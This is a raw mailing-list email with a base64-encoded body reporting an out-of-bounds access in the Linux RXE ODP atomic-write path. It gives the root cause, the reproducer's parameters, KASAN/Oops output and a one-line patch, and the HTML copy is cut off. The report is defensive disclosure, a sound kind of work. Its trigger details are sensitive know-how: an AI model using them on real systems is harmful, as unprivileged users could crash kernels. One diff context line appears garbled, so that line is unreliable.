Received: from SY8PR01CU002.outbound.protection.outlook.com (mail-australiaeastazolkn19010020.outbound.protection.outlook.com [52.103.72.20])
	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 52B8F1DDA18
	for <linux-rdma@vger.kernel.org>; Sun,  4 Oct 2026 14:08:05 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=fail smtp.client-ip=52.103.72.20
ARC-Seal:i=2; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1791122888; cv=fail; b=ZLgCbQ+bM4zsFSjTRbZNzlJN+ehujWWBt0GtnLoYfnT3HleLi0bXh9Jkv7hwTq3LkFQE0akfxcNHCuhkm7OykBASHBiK2JqHin+BzLxetSs3Ik8AxUEQKjIdYz29mrwWa5Kp+tDO3kQoaYtUvcjrxkUwlF8fRuoYvwPa3gxvxms=
ARC-Message-Signature:i=2; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1791122888; c=relaxed/simple;
	bh=DtuMD4W6f84MgXz8wJ1ITJJX5YdSdT6/VDCGRVPg4ss=;
	h=From:To:CC:Subject:Date:Message-ID:Content-Type:MIME-Version; b=U99K40rt+L/Ff/L7WfDpFBAV2UQwFhF+8DQknrOJRy6/+tHqpyP3qmPvnMYbWUOySpz0pj9D9akKgbL3lDf0ATN1oYdYrcb+7pvu9TlzOwDzV2CSjI+LdX5p+c15vpk2ZT8fkN5/3uK8LAxl+3+OMtRs6MVRHcE9Tx+2D2Q9YhY=
ARC-Authentication-Results:i=2; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=outlook.com; spf=pass smtp.mailfrom=outlook.com; dkim=pass (2048-bit key) header.d=outlook.com header.i=@outlook.com header.b=mOs+m3Mj; arc=fail smtp.client-ip=52.103.72.20
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=outlook.com
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=outlook.com
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=outlook.com header.i=@outlook.com header.b="mOs+m3Mj"
ARC-Seal: i=1; a=rsa-sha256; s=arcselector10001; d=microsoft.com; cv=none;
 b=T3TLRCIYqJwdVJwWWMZkLe4IAtiv7k5tRzQpIREOmVmZtsUDaivT0ebkI/rL8u0uimDpNLCW6pkzeDHYQuaFEJD9OABrGn4JQR8MtxVhG6NoyEvNp9gySdWvvCjqmaQ5LEf52OE6SEOSJ9RUqZ2g4QxlTR0t12BjhfhrQoQRDhe8kpODfHl9XKb2+10SVKW7oXC6JU+rDS36PtGx8QtBQAGxmiDAhQ+sxxWbT/uuElckhyNarADNx+iau7aC2gmNUY0eoVM7sR/p8ITLy9B1zrxa1t9H0erP5rZLRs5t+UtFZuxLc/jJ2X0XNaocYKBMopDqvMlacsOpdR7E63IvSQ==
ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=microsoft.com;
 s=arcselector10001;
 h=From:Date:Subject:Message-ID:Content-Type:MIME-Version:X-MS-Exchange-AntiSpam-MessageData-ChunkCount:X-MS-Exchange-AntiSpam-MessageData-0:X-MS-Exchange-AntiSpam-MessageData-1;
 bh=mrHu8/7SJ8pHusSS/8eszDDnC7sm6Tq6Y3OM+NYvqag=;
 b=Tce4SCRxxnjytL6k0MprltM6SlcR0uyIve5fkgZb4fpqyeuNMCuc9e9USCc8jkjFdowkOV/pLqKjpqMei3ZUkvkj7Zfc3cp4AM/rkSkFaX7P6nx7OtOXFNwYtbiBqsyNwFPhfUfu/W4ZirzCOjy7v7a9SE6fhC7TzrMQOKrso/2VM/jrSPLXcmqZArK4nU5alj6B8Y/1hghvQ6PmDOomQzQ4JFqH9boBlJVG8nvAvcTCrQAEPbmmltPnZssIr+CxDC0OoGSTpY+G0+Zj8QpMvWV6WTFFK951lqz0l7cFDDjp6spOr5UvE+5zV0iIO+yK7Pzp7G3xvxDxq4apHaU3Ag==
ARC-Authentication-Results: i=1; mx.microsoft.com 1; spf=none; dmarc=none;
 dkim=none; arc=none
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=outlook.com;
 s=selector1;
 h=From:Date:Subject:Message-ID:Content-Type:MIME-Version:X-MS-Exchange-SenderADCheck;
 bh=mrHu8/7SJ8pHusSS/8eszDDnC7sm6Tq6Y3OM+NYvqag=;
 b=mOs+m3Mj/oLuLWEcOIT7M9KmrLgjUhvYGecGcE/ZG6u/aAJYxWJkCrBlUh0q3ZvFr1ArZTwqy8tC9PjmoWFLS9HeBNvnvCoXAVu/E+tqvMOejz1Y3VUBGiy/3IN8pX1/FJWjgkaO07R3mTlTaXju19LKsaFUv+m0aZB3ru+iOM7QNZn1zwdSW0YpgAEIfT3QPUgjHu9Kn+ID4JAUogSh6SMprrQsoYEOQglTQwCuInzKI36ncaMg2Ms/eKvYBIHs9roAfqqOYOCMdch4foaYbx7Kgjm1WRLW+Hx8mNpd63pH6IlGKKwmc0c93NsOk1W0ld6kTWPGysgQS397G4dFNg==
Received: from SY7P300MB0292.AUSP300.PROD.OUTLOOK.COM (2603:10c6:10:236::10)
 by SY2PPFDC1FE8A4E.AUSP300.PROD.OUTLOOK.COM (2603:10c6:18::3b0) with
 Microsoft SMTP Server (version=TLS1_2,
 cipher=TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384) id 15.21.472.20; Sun, 4 Oct
 2026 14:08:00 +0000
Received: from SY7P300MB0292.AUSP300.PROD.OUTLOOK.COM
 ([fe80::6ce5:b74:1917:4555]) by SY7P300MB0292.AUSP300.PROD.OUTLOOK.COM
 ([fe80::6ce5:b74:1917:4555%4]) with mapi id 15.21.0472.016; Sun, 4 Oct 2026
 14:08:00 +0000
From: hello messi <Hello_Messi_10@outlook.com>
To: "zyjzyj2000@gmail.com" <zyjzyj2000@gmail.com>
CC: "jgg@ziepe.ca" <jgg@ziepe.ca>, "leon@kernel.org" <leon@kernel.org>,
	"linux-rdma@vger.kernel.org" <linux-rdma@vger.kernel.org>
Subject: [PATCH] RDMA/rxe: require ODP MR iova to equal the umem user address
Thread-Topic: [PATCH] RDMA/rxe: require ODP MR iova to equal the umem user
 address
Thread-Index: AQHdVAd4pHrTQoZp/EiIDDE2/yfQPA==
Date: Sun, 4 Oct 2026 14:07:59 +0000
Message-ID:
 <SY7P300MB0292E9E08F0890A2C31CFD96DE972@SY7P300MB0292.AUSP300.PROD.OUTLOOK.COM>
Accept-Language: zh-CN, en-US
Content-Language: zh-CN
X-MS-Has-Attach: yes
X-MS-TNEF-Correlator:
msip_labels:
x-ms-exchange-messagesentrepresentingtype: 1
x-ms-publictraffictype: Email
x-ms-traffictypediagnostic: SY7P300MB0292:EE_|SY2PPFDC1FE8A4E:EE_
x-ms-office365-filtering-correlation-id: be45a254-3d06-4e8c-8150-08df2220e5c8
x-microsoft-antispam:
 BCL:0;ARA:14566002|7071999006|4140399003|12121999013|25010399006|39105399006|24071999003|20031999006|24021099003|25031999004|19110799012|31061999003|8062599012|8060799015|15030799006|6092099016|15080799012|41001999006|40105399003|2607281247196008|102099032|440099028|3412199025;
x-microsoft-antispam-message-info:
 =?gb2312?B?OXZUQlBnTTJQTWFJTjNXcWFtUlVFUFN2YmR3WFBZaGFicUhqL0hhbEo0WXhW?=
 =?gb2312?B?U2FXRElKMDNDZUxTaXZnWm5jNHFrMHVIWU5pNjJsY2YyWlVmSnVwRlJaNkxH?=
 =?gb2312?B?ZlhzYmxjT1NVbW1lV09pbGlBaEJYMXFUQ2lEb01hUnJ2TWpWM0ZudzNyZTFu?=
 =?gb2312?B?NDNneHQ2eHFvSzRUVXJ6ZnN1MWV2Nm5XeVNIcVRBQmJJb3ZrQ3RJd2NsWk5t?=
 =?gb2312?B?WGhDbVgxMGF6MGtVdWpYNlNCQzVMQXJ2ZysyNmJXVnFzZzMzSmYwWUwrSGJC?=
 =?gb2312?B?TkFXaXFJaHVEdGxrRkhlSFdHR1F0MlpnZkcvQ2toMFpPL2J2T0d6Vi9XWEhJ?=
 =?gb2312?B?UUQydXpBamtPbEVxTGEzRkZSVXJ3VzdDcFV2WWhkZVRkbUJpd3E5dVdrM2pz?=
 =?gb2312?B?bVNGTnIzN2ErM3kzV3Ezb3NtSndCbmtLS2hWZ2ZSaW5qVThVd3JLSW9sdXJm?=
 =?gb2312?B?cGh2T0N0Q3JWV1k2bUpkZWNYaUlTTGc4dFZXZDR0MDJjbVMyeW1sMkdwaHM0?=
 =?gb2312?B?VlJsYThCOS8xb0xhU2VNUE01VWtGMnB1anIwaUxpOTRGbDVwSjZuSjExa3hk?=
 =?gb2312?B?NXppYnZQZDMyRmVEYjJJMGE0OFlmNzVJN01Na21EQllpdGhBWTgvME90ZEVa?=
 =?gb2312?B?Tk9SWHZ0eTUxR2UxY2Z4TUF4RHhOSmlCcHhVWDR4Y0Iwenc4RFd2bDBYbER2?=
 =?gb2312?B?bkxBbEtvZktDSng5Q2RCQkRZQk11b1hyRVRPbHRhaFdxaC9CeHlMdTB4NnVL?=
 =?gb2312?B?SGFmcTVRczhLVTBNQjhJb25PaFBwRkNzdldTdE96cmQ5YW0rR3hkM2pobFNl?=
 =?gb2312?B?L2w2RXU5Vjhqd2JqTjVWdVlORjg1c2JLeVA3M3JKVVUvb1FvUVd4NnAvbmda?=
 =?gb2312?B?c2htZlNHMCt6N2NxRzI1Ri9xMjRsdlRNcTRpZXBUTkNqZ0dHNUUxVHZhM0R1?=
 =?gb2312?B?YmlDYis0MWVDdVpweEswOWdqaFFWUFllc1BLMUt6aE5LNjBmdmdrOXhQWlhv?=
 =?gb2312?B?d1o2K2NOQTI0NTZ3dVd5d2l6N2RHMzhXVmttRE1rNktMSkpQY3pHcW1JZy9D?=
 =?gb2312?B?VXd2VzNZL0hpd0xhYldvK3VPTlVOQU5wZWo1SDlZTjVBYzBiNU5qQTJQdTJq?=
 =?gb2312?B?Sm8wWHdPSjVXZ2hRK0RKTm11SmVzaEJxZ1VBYmZ4MG0vMGoyTFBmOEQxWnFl?=
 =?gb2312?B?NU1kc3Z3NGZQakxnaTRob0RCMitBenRaVHhLMGNqZVhmWkZJODEwM08zMGZK?=
 =?gb2312?B?Vk9uUW50TmpENFRFbjdhWktmOCtnZmxGUlF6U29ZRFlqSkU0dWU2MTJDU0F2?=
 =?gb2312?B?K2tDVnpZNW5wWG5lUEsxRWliZHdLMTF6dVRiandmQTJrSkZ4U25vTS9oNThV?=
 =?gb2312?B?U3h4MmxidVNvdURWdUFIbG1WYlpFeFkybnc4c0gxeW53bm9lS1FHc3VCcW1S?=
 =?gb2312?B?SnlLYkdDbkI1a2FlL21PUk5tR2Z3TnNtdUt3Q1lkdWRaTzdWajRPL25MdE5L?=
 =?gb2312?B?YjFwSjh3TGh3cVNKQ3Rnd3RrcFFLMW1lNlFJNjFpaE00WlY2bExRbHYvVmJz?=
 =?gb2312?Q?4wRWJ7MjoWZEeib66ZsqG0vgmN0PTSZpezz8olV6Kc29c9?=
x-ms-exchange-antispam-messagedata-chunkcount: 1
x-ms-exchange-antispam-messagedata-0:
 =?gb2312?B?MkZlOUJzU3lZZytxRVlmd1R4MjFLZnFoNU9ZK2NpdUJaZkhKWGpMVmNLTDc0?=
 =?gb2312?B?SkVhLytxWHNuVkJOakJuQzZhYlhXaEpvdUpMaFp6REsveW04YUg0cDl1bmRI?=
 =?gb2312?B?bHBQZncrbm95ak1BZXhqT21hMWJSbldHaVZlc1dieTdWdEl5ZnpRMmVUTWpW?=
 =?gb2312?B?c3hEUEhkWUhrTUhKcUExNXNOWmlKUnZ5RmdHTGNaSHd2dXBSTzRVSmZ0QUdK?=
 =?gb2312?B?dkpQYXUvZ1BoZWVzcS9ET045K2E1UHpXMURuNzNIQndKckphNkFaeVd0UzAx?=
 =?gb2312?B?M0xOSkhwajg1YzJ1UFZZTTJCUFd0dE91dXJyTXhxcVFNQjJLa1pmWStja1Z3?=
 =?gb2312?B?REJrSWIxMTlhYUtNNU9pS3hoVjN0VjE3dnJaZGdzejgxZDRrUm9NQXRLK2VR?=
 =?gb2312?B?dWZDYlAyaGM4U2htQzRsOU53QnN5ZkpMc3BOQW5tWllCbitmamliSmQ2MUd1?=
 =?gb2312?B?TEtQV1hFTU04VllMQmlPSDNTT1lqZi94VFJLT2VPWTl5a0dHRFJlbUc1NjRT?=
 =?gb2312?B?cGJVU2pRWTJBSXpXTjVLZnk1TkFIMGQzcmpjbHpTK21jQ3JCVWRseFN3UC9S?=
 =?gb2312?B?WWdudk1ua2tkQVJCRlZ6T0pkbFlzWUdiMmxYYS90RXBVRUJoL0JHcWhyTUV0?=
 =?gb2312?B?OGdzZ2ZFc2ZsMkpHdjFkSVRxMWNoL1BEMEtWWlZ4ZWlDa2pxcEFheS9GOEpF?=
 =?gb2312?B?dVFLbjgzRVRHWElzZmx4M3R0V3FsblFSczd2TUpqM3ZRKzBSdExNMmR0RUdr?=
 =?gb2312?B?d0t2eGk1Z2M0QW9rUGNOQ290MnJCVG8vM004YlRtYkRyNEZNZ2FGQm9TNTc0?=
 =?gb2312?B?UHBnTElud0tlSkc2RGZvS0pMV2laeEZBYm9ONWdvUjhGUTN6VWJNRGFDSWp3?=
 =?gb2312?B?WEdhR284bkZ4RUlPbXNyTmphMU50TjQySE16SThTNkIzR3JwNFM4UUdVL3o2?=
 =?gb2312?B?L1VLUVFBYjRhaW5tc1RZQXRaUkxGTUtCZVduWXZ0RWh4MmFRQ1haeUNTYmVY?=
 =?gb2312?B?S0FjbjJyOW1GVFQ0Unc0bnRsVEZtVjh0Y3MvUnc3ZHJOSnVYZkhhbWx3Yk9B?=
 =?gb2312?B?bVBLRFZZZGszRVNiR3RoV3FocEFiOG52SHpiVzloZ2drY0FSdXprM3RNVWZT?=
 =?gb2312?B?OVg5WWxjN1p1amlTcms4NkFPbVF0d2xaZFE0SlYrNE9BUFlrS3lpeXJELzBr?=
 =?gb2312?B?S1c4aUFnQjE0R2RXblIyNXNVTldGRG95a3l1T0VkU0NCL3EwVFFSSitsVUkr?=
 =?gb2312?B?YVR0MkhjTjdSRk1VUFFmRmxWUU16cFRnV1A0SDl0QnVLWHM5aVZuQ2lsb05l?=
 =?gb2312?B?QXVEUVQzRndrOVpYK25vZG0yUkFzeTlveW9Jc3h6cTBLcUhMYXlEQ3JMakJV?=
 =?gb2312?B?WitqekZpbVgwVk9xWFV1SkhZbkNxcTEzaTZXRTFobWRSU0E5NklJYmRDZ25Z?=
 =?gb2312?B?SmJPTURmbHBrM1BpTEJUdVFLZlp3b3BFSG1IWVRCOTN3RW43bnN2dUFPejU2?=
 =?gb2312?B?TVRPYXQ0YW44bjlYWkdoOWpBa0pJK0RuZ1NFb1c1T0hiRjlkR2p1OXlidTJT?=
 =?gb2312?B?Y0JpYjIxZUl3T0NuMWdCaEhFWlNrOU5neVlHcW9FQ0JsQmVQc2pwR0NLenFL?=
 =?gb2312?B?SHVVUExiWXIySWorRWFMY2xzVVFoV3BOdVk4N0RuUzAxait3MThHdTNTS0hv?=
 =?gb2312?B?dVRnOTQ5SVJXZ0dkM2NUOTdnNE0xbHpTdVQrdnU4TFFibTl6amZ1dlVOc3dt?=
 =?gb2312?B?TXpDRGhRYjNObmZXNHVaU2kvNDUxMjNSb1Y0U2kzb2R5eDZNMk1KN3Y1RW5i?=
 =?gb2312?B?YVdJbXVWZU54dkhFWkFVdHhDbmt6SUxRdFZnazgvclNBWmhtVnRjMWZVNW5w?=
 =?gb2312?Q?LdRVd+3Fqy22V?=
Content-Type: multipart/mixed;
	boundary="_005_SY7P300MB0292E9E08F0890A2C31CFD96DE972SY7P300MB0292AUSP_"
Precedence: bulk
X-Mailing-List: linux-rdma@vger.kernel.org
List-Id: <linux-rdma.vger.kernel.org>
List-Subscribe: <mailto:linux-rdma+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:linux-rdma+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
X-OriginatorOrg: outlook.com
X-MS-Exchange-CrossTenant-AuthAs: Internal
X-MS-Exchange-CrossTenant-AuthSource: SY7P300MB0292.AUSP300.PROD.OUTLOOK.COM
X-MS-Exchange-CrossTenant-RMS-PersistedConsumerOrg: 00000000-0000-0000-0000-000000000000
X-MS-Exchange-CrossTenant-Network-Message-Id: be45a254-3d06-4e8c-8150-08df2220e5c8
X-MS-Exchange-CrossTenant-originalarrivaltime: 04 Oct 2026 14:07:59.8740
 (UTC)
X-MS-Exchange-CrossTenant-fromentityheader: Hosted
X-MS-Exchange-CrossTenant-id: 84df9e7f-e9f6-40af-b435-aaaaaaaaaaaa
X-MS-Exchange-CrossTenant-rms-persistedconsumerorg: 00000000-0000-0000-0000-000000000000
X-MS-Exchange-Transport-CrossTenantHeadersStamped: SY2PPFDC1FE8A4E

--_005_SY7P300MB0292E9E08F0890A2C31CFD96DE972SY7P300MB0292AUSP_
Content-Type: multipart/alternative;
	boundary="_000_SY7P300MB0292E9E08F0890A2C31CFD96DE972SY7P300MB0292AUSP_"

--_000_SY7P300MB0292E9E08F0890A2C31CFD96DE972SY7P300MB0292AUSP_
Content-Type: text/plain; charset="gb2312"
Content-Transfer-Encoding: base64

SGVsbG8sDQpJIGZvdW5kIGFuIG91dC1vZi1ib3VuZHMgYWNjZXNzIGluIHRoZSBSWEUgT0RQIE1S
IHBhdGggd2hlbiBhbiBPRFAgbWVtb3J5IHJlZ2lvbiBpcyByZWdpc3RlcmVkIHdpdGggYW4gSU9W
QSB0aGF0IGRpZmZlcnMgZnJvbSB0aGUgdXNlciB2aXJ0dWFsIGFkZHJlc3MgdXNlZCB0byBjcmVh
dGUgdGhlIHVuZGVybHlpbmcgaWJfdW1lbV9vZHAuDQpUaGUgaXNzdWUgd2FzIHJlcHJvZHVjZWQg
b24gTGludXggdjcuMi44IHdpdGggU29mdC1Sb0NFIChyeGUwKS4NCkVudmlyb25tZW50DQoNCktl
cm5lbDogTGludXggdjcuMi44DQpSRE1BIGRldmljZTogU29mdC1Sb0NFIChyeGUwKQ0KDQpDT05G
SUdfSU5GSU5JQkFORF9PTl9ERU1BTkRfUEFHSU5HPXkNCkNPTkZJR19SRE1BX1JYRT1tDQpDT05G
SUdfS0FTQU49eQ0KQ09ORklHX0tBU0FOX0dFTkVSSUM9eQ0KQ09ORklHX0tBU0FOX0lOTElORT15
DQpDT05GSUdfREVCVUdfSU5GTz15DQpDT05GSUdfREVCVUdfSU5GT19EV0FSRjU9eQ0KDQoNClJv
b3QgY2F1c2UNCnJ4ZV9vZHBfbXJfaW5pdF91c2VyKCkgYWNjZXB0cyBzdGFydCBhbmQgaW92YSBp
bmRlcGVuZGVudGx5Og0KDQp1bWVtX29kcCA9IGliX3VtZW1fb2RwX2dldCgmcnhlLT5pYl9kZXYs
IHN0YXJ0LCBsZW5ndGgsIGFjY2Vzc19mbGFncywNCiAgICAgICAgICAgICAgICAgICAgICAgICAg
ICZyeGVfbW5fb3BzKTsNCg0KLi4uDQoNCm1yLT5pYm1yLmxlbmd0aCA9IGxlbmd0aDsNCm1yLT5p
Ym1yLmlvdmEgPSBpb3ZhOw0KDQoNClRoZSBPRFAgcGFnZSBsaXN0IGlzIHNpemVkIGFjY29yZGlu
ZyB0byB0aGUgVU1FTSB1c2VyIGFkZHJlc3MgcmFuZ2UsIHdoaWxlIFJYRSBjYWxjdWxhdGVzIHRo
ZSBwYWdlLWxpc3QgaW5kZXggZnJvbSB0aGUgTVIgSU9WQToNCg0KaWR4ID0gKGlvdmEgLSBpYl91
bWVtX3N0YXJ0KHVtZW1fb2RwKSkgPj4gdW1lbV9vZHAtPnBhZ2Vfc2hpZnQ7DQoNCg0KVGhlcmUg
aXMgbm8gdmFsaWRhdGlvbiB0aGF0IHRoZSByZXN1bHRpbmcgaW5kZXggaXMgd2l0aGluIHVtZW1f
b2RwLT5tYXAucGZuX2xpc3QuDQptcl9jaGVja19yYW5nZSgpIGRvZXMgbm90IHByZXZlbnQgdGhp
cyBiZWNhdXNlIGl0IHZhbGlkYXRlcyB0aGUgSU9WQSBhZ2FpbnN0IG1yLT5pYm1yLmlvdmEgYW5k
IG1yLT5pYm1yLmxlbmd0aCwgcmF0aGVyIHRoYW4gYWdhaW5zdCB0aGUgdW5kZXJseWluZyBVTUVN
IHVzZXIgYWRkcmVzcyByYW5nZS4NClJlcHJvZHVjdGlvbg0KQSBtaW5pbWFsIHJlcHJvZHVjZXIg
aXMgYXR0YWNoZWQgYXMgcG9jLmMuDQpUaGUgcmVwcm9kdWNlciBjcmVhdGVzIGEgb25lLXBhZ2Ug
T0RQIE1SIHdpdGggYSBkZWxpYmVyYXRlbHkgZGl2ZXJnZW50IElPVkE6DQoNCnVzZXIgVkEgICAg
ICA6IDB4NTViMGY0ZmIyMDAwDQpPRFAgSU9WQSAgICAgOiAweDU1YjFmNGZiMjAwMA0KSU9WQSBk
ZWx0YSAgIDogMHgxMDAwMDAwMDANCk9EUCBsZW5ndGggICA6IDB4MTAwMA0KZXhwZWN0ZWQgaWR4
IDogMHgxMDAwMDANCg0KDQpUaGUgcmVzdWx0aW5nIGluZGV4IGlzIDB4MTAwMDAwLCB3aGlsZSB0
aGUgb25lLXBhZ2UgT0RQIHBmbl9saXN0IG9ubHkgY29udGFpbnMgdGhlIGVudHJ5IGNvcnJlc3Bv
bmRpbmcgdG8gdGhlIHZhbGlkIFVNRU0gcGFnZS4NClRoZSByZXByb2R1Y2VyIHRoZW4gc3VibWl0
cyBhbiBSQyBhdG9taWMtd3JpdGUgb3BlcmF0aW9uIHVzaW5nIHRoZSBNUiBya2V5IGFuZCB0aGUg
ZGl2ZXJnZW50IElPVkEsIHJlYWNoaW5nOg0KDQpyeGVfb2RwX2RvX2F0b21pY193cml0ZSgpDQog
IC0+IHJ4ZV9vZHBfaW92YV90b19pbmRleCgpDQogIC0+IHVtZW1fb2RwLT5tYXAucGZuX2xpc3Rb
aW5kZXhdDQogIC0+IGhtbV9wZm5fdG9fcGFnZSgpDQogIC0+IGttYXBfbG9jYWxfcGFnZSgpDQog
IC0+IHNtcF9zdG9yZV9yZWxlYXNlKCkNCg0KDQpUaGUgcmVwcm9kdWNlciBjYW4gYmUgZXhlY3V0
ZWQgYnkgYW4gdW5wcml2aWxlZ2VkIHVzZXIuDQpLQVNBTi9Pb3BzDQpUaGUgcmVwcm9kdWNlciB0
cmlnZ2VyczoNCg0KT29wczogZ2VuZXJhbCBwcm90ZWN0aW9uIGZhdWx0LCBwcm9iYWJseSBmb3Ig
bm9uLWNhbm9uaWNhbCBhZGRyZXNzIC4uLg0KS0FTQU46IG1heWJlIHdpbGQtbWVtb3J5LWFjY2Vz
cyAuLi4NCkNQVTogMyBVSUQ6IDAgUElEOiAxMzQ5NSBDb21tOiBrd29ya2VyL3U1MTQ6MQ0KV29y
a3F1ZXVlOiByeGVfd3EgZG9fd29yayBbcmRtYV9yeGVdDQpSSVA6IDAwMTA6cnhlX29kcF9kb19h
dG9taWNfd3JpdGUrMHgxYmEvMHgzZTAgW3JkbWFfcnhlXQ0KDQoNClVzaW5nIGZhZGRyMmxpbmU6
DQoNCnJ4ZV9vZHBfZG9fYXRvbWljX3dyaXRlKzB4MWJhLzB4M2UwOg0KcnhlX29kcF9kb19hdG9t
aWNfd3JpdGUgYXQNCi9ob21lL2thbGkvbGludXgtNy4yLjgvZHJpdmVycy9pbmZpbmliYW5kL3N3
L3J4ZS9yeGVfb2RwLmM6NDEwDQoNCg0KTGluZSA0MTAgaXM6DQoNCnNtcF9zdG9yZV9yZWxlYXNl
KCZ2YVtwYWdlX29mZnNldCA+PiAzXSwgdmFsdWUpOw0KDQoNClRoZSBhdG9taWMgdmFsdWUgc3Vw
cGxpZWQgYnkgdGhlIHJlcHJvZHVjZXIgd2FzOg0KDQphdG9taWMgdmFsdWU9MHg0MTQxNDE0MTQy
NDI0MjQyDQoNCg0KVGhlIHNhbWUgdmFsdWUgd2FzIHByZXNlbnQgaW4gdGhlIGtlcm5lbCByZWdp
c3RlciBzdGF0ZSBhdCB0aGUgdGltZSBvZiB0aGUgZmF1bHQuDQpUaGlzIGRlbW9uc3RyYXRlcyBh
biBvdXQtb2YtYm91bmRzIE9EUCBwZm5fbGlzdCBhY2Nlc3MgaW4gdGhlIFJYRSBhdG9taWMtd3Jp
dGUgcGF0aC4gSSBoYXZlIG5vdCBhc3N1bWVkIGFyYml0cmFyeSBrZXJuZWwgd3JpdGUgb3IgY29k
ZSBleGVjdXRpb24gZnJvbSB0aGlzIGNyYXNoOyB0aGUgZGVtb25zdHJhdGVkIGltcGFjdCBpcyBh
IGtlcm5lbCBtZW1vcnktc2FmZXR5IHZpb2xhdGlvbiBsZWFkaW5nIHRvIGEga2VybmVsIGZhdWx0
Lg0KUHJvcG9zZWQgZml4DQpUaGUgZXhpc3RpbmcgT0RQIGluZGV4IGNhbGN1bGF0aW9uIGFzc3Vt
ZXMgdGhhdCB0aGUgTVIgSU9WQSBhbmQgdGhlIFVNRU0gdXNlciBhZGRyZXNzIHJlZmVyIHRvIHRo
ZSBzYW1lIGFkZHJlc3MgcmFuZ2UuIFRoZSBzaW1wbGVzdCBmaXggaXMgdG8gcmVqZWN0IGFuIE9E
UCBNUiB3aGVuIHRoZXNlIGFkZHJlc3NlcyBkaWZmZXI6DQoNCmRpZmYgLS1naXQgYS9kcml2ZXJz
L2luZmluaWJhbmQvc3cvcnhlL3J4ZV9vZHAuYyBiL2RyaXZlcnMvaW5maW5pYmFuZC9zdy9yeGUv
cnhlX29kcC5jDQppbmRleCAuLi4NCi0tLSBhL2RyaXZlcnMvaW5maW5pYmFuZC9zdy9yeGUvcnhl
X29kcC5jDQorKysgYi9kcml2ZXJzL2luZmluaWJhbmQvc3cvcnhlL3J4ZV9vZHAuYw0KQEAgLTk4
LDYgKzk4LDkgQEAgaW50IHJ4ZV9vZHBfbXJfaW5pdF91c2VyKHN0cnVjdCByeGVfZGV2ICpyeGUs
IHU2NCBzdGFydCwgdTY0IGxlbmd0aCwNCiAgICAgICAgICAgICAgICAvKiBOZXZlciByZWFjaCBo
ZXJlLCBmb3IgaW1wbGljaXQgT0RQIGlzIG5vdCBpbXBsZW1lbnRlZC4gKi9yeGVfb2RwX2RvX2F0
b21pY19vcCgpDQogICAgICAgIH0NCg0KKyAgICAgICBpZiAoaW92YSAhPSBzdGFydCkNCisgICAg
ICAgICAgICAgICByZXR1cm4gLUVJTlZBTDsNCisNCiAgICAgICAgdW1lbV9vZHAgPSBpYl91bWVt
X29kcF9nZXQoJnJ4ZS0+aWJfZGV2LCBzdGFydCwgbGVuZ3RoLCBhY2Nlc3NfZmxhZ3MsDQogICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICZyeGVfbW5fb3BzKTsNCg0KDQpUaGlzIHJl
c3RvcmVzIHRoZSBpbnZhcmlhbnQgcmVxdWlyZWQgYnkgdGhlIGV4aXN0aW5nIE9EUCBpbmRleCBj
YWxjdWxhdGlvbiBhbmQgcHJldmVudHMgYSBkaXZlcmdlbnQgSU9WQSBmcm9tIHByb2R1Y2luZyBh
biBvdXQtb2YtcmFuZ2UgcGZuX2xpc3QgaW5kZXguDQpQbGVhc2UgY29uc2lkZXIgYXBwbHlpbmcg
YW4gYXBwcm9wcmlhdGUgZml4IHRvIGN1cnJlbnQgbWFpbmxpbmUgYW5kIHN0YWJsZSBrZXJuZWxz
IGFzIGFwcHJvcHJpYXRlLg0KVGhlIHJlcHJvZHVjZXIgaXMgYXR0YWNoZWQgYXMgcG9jLmMsIGFu
ZCB0aGUgcmVsZXZhbnQgS0FTQU4vT29wcyBvdXRwdXQgaXMgYXR0YWNoZWQgYXMga2FzYW4tb29w
cy50eHQuDQpUaGFua3MsDQpoZWxsb21lc3NpDQoNCg==

--_000_SY7P300MB0292E9E08F0890A2C31CFD96DE972SY7P300MB0292AUSP_
Content-Type: text/html; charset="gb2312"
Content-Transfer-Encoding: quoted-printable

<html>
<head>
<meta http-equiv=3D"Content-Type" content=3D"text/html; charset=3Dgb2312">
<style type=3D"text/css" style=3D"display:none;"> P {margin-top:0;margin-bo=
ttom:0;} </style>
</head>
<body dir=3D"ltr">
<div class=3D"elementToProof" style=3D"margin-top: 1em; margin-bottom: 1em;=
 font-family: Calibri, Helvetica, sans-serif; font-size: 12pt; color: rgb(0=
, 0, 0);">
Hello,</div>
<div class=3D"elementToProof" style=3D"margin-top: 1em; margin-bottom: 1em;=
 font-family: Calibri, Helvetica, sans-serif; font-size: 12pt; color: rgb(0=
, 0, 0);">
I found an out-of-bounds access in the RXE ODP MR path when an ODP memory r=
egion is registered with an IOVA that differs from the user virtual address=
 used to create the underlying
<code>ib_umem_odp</code>.</div>
<div class=3D"elementToProof" style=3D"margin-top: 1em; margin-bottom: 1em;=
 font-family: Calibri, Helvetica, sans-serif; font-size: 12pt; color: rgb(0=
, 0, 0);">
The issue was reproduced on Linux v7.2.8 with Soft-RoCE (<code>rxe0</code>)=
.</div>
<div class=3D"elementToProof" style=3D"font-family: Calibri, Helvetica, san=
s-serif; font-size: 12pt; color: rgb(0, 0, 0);">
<b>Environment</b></div>
<pre class=3D"elementToProof"><div class=3D"elementToProof" style=3D"white-=
space: pre; font-family: Calibri, Helvetica, sans-serif; font-size: 12pt; c=
olor: rgb(0, 0, 0);"><code>Kernel: Linux v7.2.8=0A=
RDMA device: Soft-RoCE (rxe0)=0A=
=0A=
CONFIG_INFINIBAND_ON_DEMAND_PAGING=3Dy=0A=
CONFIG_RDMA_RXE=3Dm=0A=
CONFIG_KASAN=3Dy=0A=
CONFIG_KASAN_GENERIC=3Dy=0A=
CONFIG_KASAN_INLINE=3Dy=0A=
